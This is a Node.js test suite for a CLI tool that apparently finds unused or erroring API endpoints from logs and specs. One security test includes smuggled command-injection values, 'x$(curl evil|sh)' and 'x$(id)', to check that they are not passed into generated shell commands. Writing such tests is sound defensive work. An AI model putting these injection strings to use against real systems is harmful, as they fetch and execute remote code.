import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync, spawn } from 'node:child_process';
import { readFileSync, existsSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { makeRepo, ES_GATEWAY } from './fixtures/make-repo.mjs';
import { detectProject } from '../src/setup/detect.mjs';
import { parseRoutes, toOpenApiPath, routesToOpenApi } from '../src/routes.mjs';
import { loadSpec, matchOp } from '../src/spec.mjs';

const BIN = new URL('../bin/api-dead-ends.mjs', import.meta.url).pathname;
const run = (cwd, args, input) => spawnSync(process.execPath, [BIN, ...args], { cwd, encoding: 'utf8', input });

test('detect: polyglot repo → one service per manifest, frameworks, specs, observability', async () => {
  const d = await detectProject(makeRepo());
  const by = Object.fromEntries(d.services.map((s) => [s.name, s]));
  assert.deepEqual(Object.keys(by).sort(), ['accounts', 'catalog', 'gateway', 'orders', 'payments', 'shop-web']);
  assert.deepEqual([by.gateway.language, by.gateway.frameworks], ['node', ['express']]);
  assert.deepEqual([by.orders.language, by.orders.frameworks], ['go', ['gin']]);
  assert.deepEqual([by.payments.language, by.payments.frameworks], ['java', ['spring']]);
  assert.deepEqual(by.catalog.frameworks, ['fastapi']);
  assert.deepEqual(by.accounts.frameworks, ['rails']);
  assert.deepEqual(by['shop-web'].frameworks, ['next']);
  assert.deepEqual(by.gateway.specs, ['services/gateway/openapi.json']);
  assert.ok(d.observability.includes('elasticsearch'));
  assert.ok(by.payments.observability.includes('prometheus'));
  assert.ok(by.gateway.loggers.includes('pino-http'));
});

test('routes: rails, gin, flask, spring, laravel, express-list-endpoints, django, plain', () => {
  assert.equal(toOpenApiPath('/users/:id(.:format)'), '/users/{id}');
  assert.equal(toOpenApiPath('/u/<int:pk>/'), '/u/{pk}');
  assert.equal(toOpenApiPath('users/{id?}'), '/users/{id}');
  assert.equal(toOpenApiPath('/files/*rest'), '/files/{rest}');
  const rails = parseRoutes('  user GET    /users/:id(.:format)   users#show\n       PATCH  /users/:id(.:format)   users#update\nPrefix Verb URI Pattern');
  assert.deepEqual(rails.map((r) => `${r.method} ${r.path}`), ['GET /users/{id}', 'PATCH /users/{id}']);
  const gin = parseRoutes('[GIN-debug] GET    /ping   --> main.main.func1 (3 handlers)');
  assert.deepEqual(gin[0], { method: 'GET', path: '/ping' });
  const flask = parseRoutes("<Rule '/items/<int:id>' (GET, HEAD, OPTIONS) -> item>\nitem_save  POST, PUT  /items/<int:id>");
  assert.deepEqual(flask.map((r) => `${r.method} ${r.path}`), ['GET /items/{id}', 'POST /items/{id}', 'PUT /items/{id}']);
  const spring = parseRoutes(JSON.stringify({ contexts: { app: { mappings: { dispatcherServlets: { d: [{ predicate: '{GET [/pay/{id}], produces [application/json]}' }, { predicate: '{ [/error]}' }] } } } } }));
  assert.deepEqual(spring.map((r) => `${r.method} ${r.path}`), ['GET /pay/{id}', 'ANY /error']);
  const laravel = parseRoutes(JSON.stringify([{ method: 'GET|HEAD', uri: 'api/users/{user}' }]));
  assert.deepEqual(laravel, [{ method: 'GET', path: '/api/users/{user}' }]);
  const ele = parseRoutes(JSON.stringify([{ path: '/a/:id', methods: ['GET', 'POST'] }]));
  assert.equal(ele.length, 2);
  const django = parseRoutes('/admin/\tdjango.contrib.admin\tadmin:index\n/api/users/<int:pk>/\tapi.views.User\tuser');
  assert.deepEqual(django.map((r) => `${r.method} ${r.path}`), ['ANY /admin', 'ANY /api/users/{pk}']);
});

test('spec: ANY routes match every method, explicit method wins', () => {
  const s = loadSpec(routesToOpenApi([{ method: 'ANY', path: '/x/{id}' }, { method: 'GET', path: '/x/{id}' }]));
  assert.equal(matchOp(s.ops, 'DELETE', '/x/5').method, 'ANY');
  assert.equal(matchOp(s.ops, 'GET', '/x/5').method, 'GET');
});

test('init --yes --json --dry-run: plan for every service, nothing written', () => {
  const dir = makeRepo();
  const r = run(dir, ['init', '--yes', '--json', '--dry-run', '--source', 'elasticsearch']);
  assert.equal(r.status, 0, r.stderr);
  const plan = JSON.parse(r.stdout);
  assert.equal(plan.config.source.type, 'elasticsearch');
  assert.equal(plan.config.services.length, 6);
  const gw = plan.steps.find((s) => s.service === 'gateway');
  assert.match(gw.steps.at(-1).cmd, /report --usage .*--spec services\/gateway\/openapi.json/);
  const orders = plan.steps.find((s) => s.service === 'orders');
  assert.match(orders.steps[0].cmd, /spec from-routes services\/orders\/routes.txt --title orders/); // routes.txt found by the scan
  const payments = plan.steps.find((s) => s.service === 'payments');
  assert.match(payments.steps[0].note, /v3\/api-docs/); // no spec, no route file → how to get one from Spring
  assert.ok(!existsSync(join(dir, 'api-dead-ends.config.json')));
});

test('init interactive via pipe: answers by line, Enter = default; refuses to overwrite', () => {
  const dir = makeRepo();
  // source 1 (ES) · access 1 · index · services 3,4 (gateway, orders: alphabetical scan) · per service: log name, spec, (routes) · days · AI 2 · confirm
  const answers = ['1', '3', 'logs-shop-*', '3,4', 'gateway-svc', '', 'orders-svc', '', 'services/orders/routes.txt', '30', '2', 'y'].join('\n') + '\n';
  const r = run(dir, ['init'], answers);
  assert.equal(r.status, 0, r.stderr + r.stdout);
  const cfg = JSON.parse(readFileSync(join(dir, 'api-dead-ends.config.json'), 'utf8'));
  assert.equal(cfg.source.index, 'logs-shop-*');
  assert.deepEqual(cfg.services.map((s) => [s.name, s.logName]), [['gateway', 'gateway-svc'], ['orders', 'orders-svc']]);
  assert.equal(cfg.services[1].routes, 'services/orders/routes.txt');
  assert.equal(cfg.days, 30);
  const next = readFileSync(join(dir, '.api-dead-ends/NEXT-STEPS.md'), 'utf8');
  assert.match(next, /spec from-routes services\/orders\/routes.txt/);
  assert.match(readFileSync(join(dir, '.api-dead-ends/AGENT.md'), 'utf8'), /Never delete/);
  const again = run(dir, ['init', '--yes']);
  assert.equal(again.status, 2);
  assert.match(again.stderr, /already exists/);
});

test('cli: help exits 0, init --help prints help and writes nothing, unknown flag is a clean error', () => {
  const dir = makeRepo();
  assert.equal(run(dir, ['--help']).status, 0);
  const h = run(dir, ['init', '--help']);
  assert.equal(h.status, 0);
  assert.match(h.stdout, /--yes/);
  assert.ok(!existsSync(join(dir, 'api-dead-ends.config.json')));
  const u = run(dir, ['init', '--recorder']);
  assert.equal(u.status, 2);
  assert.doesNotMatch(u.stderr, /at .*node:internal/);
  const empty = run(dir, ['init'], '');
  assert.equal(empty.status, 2, 'no TTY, no answers, no --yes → refuse');
  assert.ok(!existsSync(join(dir, 'api-dead-ends.config.json')));
});

test('report: literal on a parameter is flagged; 5xx below threshold listed; zero traffic refused', () => {
  const dir = makeRepo();
  writeFileSync(join(dir, 'u.csv'), 'method,path,calls,status\nGET,/orders/{id},1000,200:990|500:10\nGET,/orders/export,50,200:50\nGET,/orders,100,200:95|500:5\n');
  run(dir, ['spec', 'from-routes', 'services/orders/routes.txt', '-o', 'o.json']);
  const r = run(dir, ['report', '--usage', 'u.csv', '--spec', 'o.json', '--json']);
  const j = JSON.parse(r.stdout);
  assert.deepEqual(j.ambiguous.map((a) => a.path), ['/orders/export']);
  assert.deepEqual(j.errorsBelow.map((e) => e.path), ['/orders/{id}', '/orders']);
  assert.equal(j.endpoints.find((e) => e.method === 'GET' && e.path === '/orders/{id}').calls, 1050, 'counted into the operation (a slug must not look "not called")');
  assert.equal(j.totals.shadow, 0, 'only a hint, not a CI-failing shadow');
  writeFileSync(join(dir, 'z.csv'), 'method,path,calls\n');
  const z = run(dir, ['report', '--usage', 'z.csv', '--spec', 'o.json']);
  assert.equal(z.status, 2);
  assert.match(z.stderr, /No traffic/);
});

test('templating: token-like segments are folded, ordinary words stay', async () => {
  const { templatePath } = await import('../src/template.mjs');
  assert.equal(templatePath('/share/AbCdEfGhIjKl'), '/share/{id}');
  assert.equal(templatePath('/share/sk_live_abcdefgh'), '/share/{id}');
  assert.equal(templatePath('/api/getUserById'), '/api/getUserById');
  assert.equal(templatePath('/api/orders/export'), '/api/orders/export');
});

test('security: hostile service names never reach generated shell commands', async () => {
  const { buildSteps } = await import('../src/setup/plan.mjs');
  const steps = buildSteps({ version: 1, source: { type: 'datadog-apm' }, days: 30, ai: { mode: 'off' }, out: '.api-dead-ends',
    services: [{ name: 'x$(curl evil|sh)', dir: '.', language: 'node', frameworks: [], logName: 'x$(id)', spec: 'a b.json', routes: null }] });
  for (const st of steps[0].steps) if (st.cmd) {
    assert.doesNotMatch(st.cmd.replace(/'[^']*'/g, "''"), /\$\(|`|\|sh/, st.cmd);
  }
});

test('correctness: slugs stay with their operation; status classes and objects; dates with offsets; flags validated', () => {
  const dir = makeRepo();
  writeFileSync(join(dir, 's.json'), JSON.stringify({ openapi: '3.0.0', info: { title: 't', version: '1' }, paths: { '/categories/{slug}': { get: {} }, '/a': { get: {} } } }));
  writeFileSync(join(dir, 'u.json'), JSON.stringify([
    { method: 'GET', path: '/categories/books', calls: 5000, status: { 200: 4900, 500: 100 }, first_seen: '2026-01-01T00:00:00+00:00', last_seen: '2026-01-31 00:00:00 UTC' },
    { method: 'GET', path: '/categories/music', calls: '3,000', status: '200:3000' },
    { method: 'GET', path: '/a', calls: 100, status: '2xx:50|5xx:50' },
  ]));
  const j = JSON.parse(run(dir, ['report', '--usage', 'u.json', '--spec', 's.json', '--json']).stdout);
  const cat = j.endpoints.find((e) => e.path === '/categories/{slug}');
  assert.equal(cat.class, 'used');
  assert.equal(cat.calls, 8000);
  assert.equal(cat.errors5xx, 100);
  assert.equal(j.endpoints.find((e) => e.path === '/a').errors5xx, 50);
  assert.equal(j.window.days, 31);
  const pct = JSON.parse(run(dir, ['report', '--usage', 'u.json', '--spec', 's.json', '--json', '--error-share', '1']).stdout);
  assert.equal(pct.thresholds.errorShare, 0.01, '--error-share is a percent');
  assert.equal(run(dir, ['report', '--usage', 'u.json', '--spec', 's.json', '--rare', 'abc']).status, 2);
  assert.equal(run(dir, ['report', '--usage', 'u.json', '--spec', 's.json', '--baseline', 'x.json', '--fail-on', 'new_shadow']).status, 2);
  assert.match(run(dir, ['query', 'elasticsearch', '--days', '60']).stdout, /now-60d/);
});

test('end to end on the synthetic repo: init plan → convert → spec from-routes → report', () => {
  const dir = makeRepo();
  writeFileSync(join(dir, 'es.json'), JSON.stringify(ES_GATEWAY));
  assert.equal(run(dir, ['convert', 'elasticsearch', 'es.json', '--spec', 'services/gateway/openapi.json', '-o', 'usage.csv']).status, 0);
  const rep = run(dir, ['report', '--usage', 'usage.csv', '--spec', 'services/gateway/openapi.json', '--out', 'rep']);
  assert.equal(rep.status, 0, rep.stderr);
  const j = JSON.parse(readFileSync(join(dir, 'rep/report.json'), 'utf8'));
  assert.equal(j.totals.shadow, 1);
  assert.equal(j.serverErrors[0].path, '/api/products/{id}');
  const sp = run(dir, ['spec', 'from-routes', 'services/accounts/routes.txt', '-o', 'out/accounts.json']);
  assert.equal(sp.status, 0, sp.stderr);
  assert.ok(JSON.parse(readFileSync(join(dir, 'out/accounts.json'), 'utf8')).paths['/users/{id}'].patch);
});

test('mcp: legacy initialize, modern discover, tools/list, tools/call, version error', async () => {
  const dir = makeRepo();
  const p = spawn(process.execPath, [BIN, 'mcp'], { cwd: dir });
  const lines = [];
  let buf = '';
  p.stdout.on('data', (d) => { buf += d; let i; while ((i = buf.indexOf('\n')) >= 0) { lines.push(JSON.parse(buf.slice(0, i))); buf = buf.slice(i + 1); } });
  const msgs = [
    { jsonrpc: '2.0', id: 1, method: 'initialize', params: { protocolVersion: '2025-06-18', capabilities: {}, clientInfo: { name: 't', version: '1' } } },
    { jsonrpc: '2.0', method: 'notifications/initialized' },
    { jsonrpc: '2.0', id: 2, method: 'tools/list' },
    { jsonrpc: '2.0', id: 3, method: 'tools/call', params: { name: 'detect_project', arguments: {} } },
    { jsonrpc: '2.0', id: 4, method: 'server/discover', params: { _meta: { 'io.modelcontextprotocol/protocolVersion': '2026-07-28' } } },
    { jsonrpc: '2.0', id: 5, method: 'tools/list', params: { _meta: { 'io.modelcontextprotocol/protocolVersion': '1900-01-01' } } },
    { jsonrpc: '2.0', id: 6, method: 'tools/call', params: { name: 'nope' } },
  ];
  p.stdin.end(msgs.map((m) => JSON.stringify(m)).join('\n') + '\n');
  await new Promise((r) => p.on('close', r));
  const by = Object.fromEntries(lines.map((l) => [l.id, l]));
  assert.equal(by[1].result.protocolVersion, '2025-06-18');
  assert.ok(by[2].result.tools.every((t) => /^[a-z_]+$/.test(t.name)));
  assert.equal(by[3].result.isError, false);
  assert.equal(by[3].result.structuredContent.services.length, 6);
  assert.deepEqual(by[4].result.supportedVersions, ['2026-07-28']);
  assert.equal(by[5].error.code, -32022);
  assert.equal(by[6].error.code, -32602);
  assert.equal(lines.length, 6, 'notifications get no reply');
});

test('NEXT-STEPS commands run as written (copy-paste), outputs land in the git-ignored folder', () => {
  const dir = makeRepo();
  writeFileSync(join(dir, 'a.log'), '203.0.113.1 - - [10/Nov/2026:10:00:00 +0000] "GET /users/12 HTTP/1.1" 500 1 "-" "-"\n'.repeat(20));
  const init = run(dir, ['init', '--yes', '--source', 'accesslog', '--service', 'accounts', '--logs', 'a.log', '--json']);
  assert.equal(init.status, 0, init.stderr);
  const plan = JSON.parse(init.stdout);
  for (const st of plan.steps[0].steps) {
    if (!st.cmd) continue;
    const sh = spawnSync('/bin/sh', ['-c', st.cmd.replace(plan.config.cmd, `"${process.execPath}" "${BIN}"`)], { cwd: dir, encoding: 'utf8' });
    assert.equal(sh.status, 0, `${st.cmd}\n${sh.stderr}`);
  }
  assert.ok(existsSync(join(dir, '.api-dead-ends/accounts/report/report.md')));
  assert.ok(!existsSync(join(dir, 'api-dead-ends')), 'no folder without the dot');
});

test('mcp: no directories are created through a symlink; batches and null params get proper errors', async () => {
  const { mkdtempSync, mkdirSync, symlinkSync } = await import('node:fs');
  const { tmpdir } = await import('node:os');
  const base = mkdtempSync(join(tmpdir(), 'ade-mk-'));
  const repo = makeRepo(join(base, 'repo'));
  mkdirSync(join(base, 'outside'));
  symlinkSync(join(base, 'outside'), join(repo, 'link'));
  const p = spawn(process.execPath, [BIN, 'mcp'], { cwd: repo });
  let out = '';
  p.stdout.on('data', (d) => { out += d; });
  p.stdin.end([
    JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'initialize', params: null }),
    JSON.stringify([{ jsonrpc: '2.0', id: 2, method: 'ping' }]),
    JSON.stringify({ jsonrpc: '2.0', id: 3, method: 'tools/call', params: { name: 'spec_from_routes', arguments: { file: 'services/orders/routes.txt', out: 'link/newdir/deep/x.json' } } }),
  ].join('\n') + '\n');
  await new Promise((r) => p.on('close', r));
  const msgs = out.trim().split('\n').map((l) => JSON.parse(l));
  assert.ok(msgs.find((m) => m.id === 1).result.protocolVersion);
  assert.equal(msgs.find((m) => m.id === null).error.code, -32600);
  assert.equal(msgs.find((m) => m.id === 3).result.isError, true);
  assert.ok(!existsSync(join(base, 'outside', 'newdir')));
});

test('windows: per-day usage gives 30/7/3/1-day windows and finds a recent spike hidden by the average', () => {
  const dir = makeRepo();
  const lines = ['method,path,calls,status,day'];
  for (let d = 1; d <= 30; d++) {
    const day = `2026-11-${String(d).padStart(2, '0')}`;
    lines.push(`GET,/api/products,1000,200:1000,${day}`);
    lines.push(`GET,/api/cart,1000,${d >= 29 ? '200:900|500:100' : '200:1000'},${day}`);
  }
  writeFileSync(join(dir, 'd.csv'), lines.join('\n') + '\n');
  const r = run(dir, ['report', '--usage', 'd.csv', '--spec', 'services/gateway/openapi.json', '--out', 'rep']);
  assert.equal(r.status, 0, r.stderr);
  const j = JSON.parse(readFileSync(join(dir, 'rep/report.json'), 'utf8'));
  assert.equal(j.window.days, 30);
  assert.deepEqual(j.spikes.map((s) => s.path), ['/api/cart']);
  assert.match(readFileSync(join(dir, 'rep/report.html'), 'utf8'), /"7":/);
  assert.match(r.stderr, /Recent spikes: 1/);
});

test('duplicates: repeated POSTs from the same client within 2 s, retries after errors; no IPs in the output', () => {
  const dir = makeRepo();
  const L = (ip, t, m, p, s) => `${ip} - - [10/Nov/2026:10:00:${String(t).padStart(2, '0')} +0000] "${m} ${p} HTTP/1.1" ${s} 1 "-" "app/1.0"`;
  writeFileSync(join(dir, 'a.log'), [
    L('198.51.100.1', 0, 'POST', '/orders', 201), L('198.51.100.1', 1, 'POST', '/orders', 500), // double click
    L('198.51.100.1', 2, 'POST', '/orders', 201), // retry after the 500
    L('198.51.100.2', 1, 'POST', '/orders', 201), // another client: not a duplicate
    L('198.51.100.1', 30, 'POST', '/orders', 201), // much later: not a duplicate
    L('198.51.100.1', 5, 'GET', '/orders', 200), L('198.51.100.1', 5, 'GET', '/orders', 200), // GETs are ignored
  ].join('\n') + '\n');
  const c = run(dir, ['convert', 'accesslog', 'a.log', '-o', 'u.csv', '--duplicates', 'dup.json']);
  assert.equal(c.status, 0, c.stderr);
  const d = JSON.parse(readFileSync(join(dir, 'dup.json'), 'utf8'));
  assert.deepEqual(d.rows.map((x) => [x.method, x.path, x.calls, x.repeats, x.afterError]), [['POST', '/orders', 5, 2, 1]]);
  assert.doesNotMatch(readFileSync(join(dir, 'dup.json'), 'utf8'), /198\.51/);
  const r = run(dir, ['report', '--usage', 'u.csv', '--spec', 'services/gateway/openapi.json', '--duplicates', 'dup.json', '--days', '1', '--out', 'rep']);
  assert.equal(r.status, 0, r.stderr);
  assert.match(readFileSync(join(dir, 'rep/report.md'), 'utf8'), /Repeated non-GET requests/);
});

test('coverage: endpoints seen by the reference source but missing or under-logged in app logs', () => {
  const dir = makeRepo();
  writeFileSync(join(dir, 'ingress.csv'), 'method,path,calls\nGET,/api/products,1000\nGET,/api/cart,500\nGET,/api/products/7,300\nGET,/api/legacy/feed,5\n');
  writeFileSync(join(dir, 'app.csv'), 'method,path,calls\nGET,/api/products,990\nGET,/api/products/9,100\n');
  const r = run(dir, ['coverage', '--usage', 'app.csv', '--reference', 'ingress.csv', '--spec', 'services/gateway/openapi.json', '--json']);
  assert.equal(r.status, 0, r.stderr);
  const c = JSON.parse(r.stdout);
  assert.deepEqual(c.notLogged.map((x) => x.path), ['/api/cart']);
  assert.deepEqual(c.underLogged.map((x) => [x.path, x.checked, x.reference]), [['/api/products/{id}', 100, 300]]);
});

test('logging-check: finds explicit "do not log" settings with file and line', () => {
  const dir = makeRepo();
  writeFileSync(join(dir, 'nginx.conf'), 'server {\n  location /health {\n    access_log off;\n  }\n}\n');
  writeFileSync(join(dir, 'services/gateway/app.js'), "const app = require('express')();\napp.use(morgan('combined', { skip: (req) => req.url === '/metrics' }));\n");
  const r = run(dir, ['logging-check', '.', '--json']);
  assert.equal(r.status, 0, r.stderr);
  const j = JSON.parse(r.stdout);
  assert.deepEqual(j.findings.map((f) => [f.file, f.line, f.rule]).sort(), [['nginx.conf', 3, 'nginx-access-log-off'], ['services/gateway/app.js', 2, 'morgan-skip']]);
});

test('spec from-next: App Router route files and pages/api become an OpenAPI spec', async () => {
  const { mkdirSync } = await import('node:fs');
  const dir = makeRepo();
  const w = (p, body) => { mkdirSync(join(dir, 'web', p, '..'), { recursive: true }); writeFileSync(join(dir, 'web', p), body); };
  w('app/api/products/[id]/route.ts', 'export async function GET(req) {}\nexport const DELETE = async () => {};\n');
  w('app/(shop)/api/cart/route.js', 'export function POST() {}\n');
  w('app/api/docs/[[...slug]]/route.ts', 'export function GET() {}\n');
  w('src/pages/api/hello.ts', 'export default function handler(req, res) {}\n');
  w('app/page.tsx', 'export default function Page() {}\n');
  const r = run(dir, ['spec', 'from-next', 'web', '-o', 'next.json']);
  assert.equal(r.status, 0, r.stderr);
  const paths = JSON.parse(readFileSync(join(dir, 'next.json'), 'utf8')).paths;
  assert.deepEqual(Object.keys(paths).sort(), ['/api/cart', '/api/docs', '/api/docs/{slug*}', '/api/hello', '/api/products/{id}']);
  const { loadSpec: ls, matchOp: mo } = await import('../src/spec.mjs');
  const sp = ls(JSON.parse(readFileSync(join(dir, 'next.json'), 'utf8')));
  assert.equal(mo(sp.ops, 'GET', '/api/docs/a/b/c').path, '/api/docs/{slug*}', 'catch-all spans several segments');
  assert.ok(paths['/api/products/{id}'].get && paths['/api/products/{id}'].delete);
  assert.ok(paths['/api/hello']['x-ade-any-method']);
});

test('review fixes: no fake windows without a day column; calendar windows; whole-period days match', () => {
  const dir = makeRepo();
  writeFileSync(join(dir, 'u.csv'), 'method,path,calls,first_seen,last_seen,status\nGET,/api/products,20000,2026-01-01T00:00:00Z,2026-01-01T00:00:00Z,200:20000\nGET,/api/products,40,2026-01-28T00:00:00Z,2026-01-28T00:00:00Z,500:40\n');
  const j = JSON.parse(run(dir, ['report', '--usage', 'u.csv', '--spec', 'services/gateway/openapi.json', '--json']).stdout);
  assert.deepEqual(j.spikes, [], 'first_seen alone does not create per-day windows');
  writeFileSync(join(dir, 'd.csv'), 'method,path,calls,status,day\nGET,/api/products,10,200:10,2026-01-01\nGET,/api/products,10,200:10,2026-01-02\nGET,/api/products,10,200:10,2026-01-10\n');
  const r = run(dir, ['report', '--usage', 'd.csv', '--spec', 'services/gateway/openapi.json', '--out', 'rep', '--days', '90']);
  assert.equal(r.status, 0, r.stderr);
  const k = JSON.parse(readFileSync(join(dir, 'rep/report.json'), 'utf8'));
  assert.equal(k.window.days, 10, 'calendar span, --days ignored for per-day data');
  assert.match(r.stderr, /--days 90 is ignored/);
  assert.match(readFileSync(join(dir, 'rep/report.html'), 'utf8'), /"7":/, '7-day window exists inside a 10-day span');
});

test('what changed: today vs the same hours on previous days, first error hour, traffic changes; error texts in the report', () => {
  const dir = makeRepo();
  const L = ['method,path,calls,status,hour'];
  const days = ['2026-11-24', '2026-11-25', '2026-11-26'];
  for (const d of days) for (let h = 0; h < 12; h++) {
    const hh = `${d}T${String(h).padStart(2, '0')}`;
    const today = d === '2026-11-26';
    L.push(`GET,/api/products,${today ? 1000 : 1000},200:1000,${hh}`);
    L.push(`POST,/api/cart,500,${today && h >= 9 ? '200:300|500:200' : '200:500'},${hh}`);
    L.push(`GET,/api/products/7,${today ? 400 : 100},200:${today ? 400 : 100},${hh}`);
  }
  writeFileSync(join(dir, 'h.csv'), L.join('\n') + '\n');
  writeFileSync(join(dir, 'err.json'), JSON.stringify({ note: 'n', endpoints: [{ method: 'POST', path: '/api/cart', errors5xx: 600, messages: [{ text: 'pq: canceling statement due to user request', count: 300, firstSeen: '2026-11-26T09:57:00Z', trace: 'abc' }] }] }));
  const r = run(dir, ['report', '--usage', 'h.csv', '--spec', 'services/gateway/openapi.json', '--include-today', '--errors', 'err.json', '--tz', 'America/New_York', '--out', 'rep']);
  assert.equal(r.status, 0, r.stderr);
  const j = JSON.parse(readFileSync(join(dir, 'rep/report.json'), 'utf8'));
  const c = j.changes;
  assert.ok(c, 'changes computed');
  assert.deepEqual(c.errorsUp.map((x) => [x.path, x.firstErrorHour]), [['/api/cart', 9]]);
  assert.deepEqual(c.callsUp.map((x) => x.path), ['/api/products/{id}']);
  const md = readFileSync(join(dir, 'rep/report.md'), 'utf8');
  assert.match(md, /What changed today/);
  assert.match(md, /09:00 UTC \(04:00 EST\)/);
  assert.match(md, /canceling statement/);
  assert.match(r.stderr, /Today vs the same hours before/);
});

test('error texts: masking and grouping through traces (mock search)', async () => {
  const { collectErrors, maskText, pickErrorFields } = await import('../src/adapters/errortexts.mjs');
  assert.equal(maskText('Order 00268d8f-a131-45be-9a96-ed114ca7bf3a has 12345 items, mail a.b@c.io'), 'Order {uuid} has {n} items, mail {email}');
  assert.deepEqual(pickErrorFields(new Set(['x-trace-id', 'error.message.keyword'])), { traceField: 'x-trace-id', errorField: 'error.message.keyword' });
  const calls = [];
  const search = async (q) => {
    calls.push(q);
    if (q.aggs.ep) return { aggregations: { ep: { buckets: [{ key: '/orders/{id}', doc_count: 9, m: { buckets: [{ key: 'DELETE' }] }, t: { buckets: [{ key: '4bf92f3577b34da6a3ce929d0e0e4736' }, { key: '00f067aa0ba902b74bf92f3577b34da6' }, { key: '-' }] } }] } } };
    return { aggregations: { msg: { buckets: [
      { key: 'Order 00268d8f-a131-45be-9a96-ed114ca7bf3a has active tx', doc_count: 2, first: { value_as_string: '2026-11-26T06:00:00Z' }, ex: { hits: { hits: [{ _source: { 'x-trace-id': 't1' } }] } } },
      { key: 'Order 014d4d69-5355-4e2b-aae6-384304e6414c has active tx', doc_count: 3, first: { value_as_string: '2026-11-26T05:00:00Z' }, ex: { hits: { hits: [{ _source: { 'x-trace-id': 't2' } }] } } },
    ] } } };
  };
  const r = await collectErrors(search, { methodField: 'http.request.method', pathField: 'url.original', statusField: 'http.response.status_code', timeField: '@timestamp', traceField: 'x-trace-id', errorField: 'error.message.keyword', service: 'svc' });
  assert.equal(r.endpoints[0].messages.length, 1, 'same message with different IDs is grouped');
  assert.deepEqual([r.endpoints[0].messages[0].text, r.endpoints[0].messages[0].count, r.endpoints[0].messages[0].firstSeen], ['Order {uuid} has active tx', 5, '2026-11-26T05:00:00Z']);
  assert.equal(r.endpoints[0].traces, 2, 'placeholder trace id "-" is dropped');
  const traceQ = calls.find((q) => q.aggs.msg);
  assert.equal(JSON.stringify(traceQ.query).includes('svc'), false, 'the trace query is not limited to the service');
});

test('error texts: secrets and personal data are masked; weak trace ids are refused', async () => {
  const { maskText, goodTraceId } = await import('../src/adapters/errortexts.mjs');
  const m = (/** @type {string} */ x) => maskText(x);
  assert.equal(m('invalid token eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abc-def_1'), 'invalid token {jwt}');
  assert.equal(m('Authorization: Bearer abc.def-123'), 'Authorization: {secret}');
  assert.equal(m('GET /a?token=s3cret&x=1 failed'), 'GET /a?{query} failed');
  assert.equal(m('password=hunter2 rejected'), 'password={secret} rejected');
  assert.equal(m('connect to postgres://admin:pw@db:5432 failed'), 'connect to postgres://{user}@db:{n} failed');
  assert.equal(m('peer 10.0.0.12 reset'), 'peer {ip} reset');
  assert.equal(m('Key (username)=(jdoe) already exists'), 'Key (username)=({value}) already exists');
  assert.equal(m('api key sk_live_51HxAbCdEf12345678 revoked'), 'api key {token} revoked');
  assert.equal(m('bidi \u202etxt.exe\u001b[31m'), 'bidi  txt.exe [31m');
  assert.equal(m('canceling statement due to user request'), 'canceling statement due to user request');
  for (const bad of ['-', '0', 'null', 'aaaaaaaa', 'short']) assert.equal(goodTraceId(bad), false, bad);
  assert.equal(goodTraceId('4bf92f3577b34da6a3ce929d0e0e4736'), true);
});

test('error fields: the field this service fills wins over an empty one', async () => {
  const { pickErrorFields } = await import('../src/adapters/errortexts.mjs');
  const agg = new Set(['trace.id', 'x-trace-id', 'error.message.keyword']);
  assert.equal(pickErrorFields(agg, new Map([['trace.id', 0], ['x-trace-id', 900], ['error.message', 50]])).traceField, 'x-trace-id');
});
